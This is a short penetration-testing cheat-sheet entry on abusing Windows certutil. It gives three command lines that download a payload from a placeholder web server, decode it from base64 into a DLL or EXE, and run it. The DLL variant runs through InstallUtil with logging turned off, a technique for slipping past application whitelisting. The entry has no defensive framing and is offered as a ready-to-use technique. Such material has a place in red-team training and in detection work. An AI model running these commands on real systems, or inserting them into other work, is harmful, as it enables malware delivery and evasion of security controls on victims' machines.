### certutil - windows powershell

```powershell
# Multiple ways to download and execute files:
certutil -urlcache -split -f http://webserver/payload payload

# Execute a specific .dll:
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll

# Execute an .exe:
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
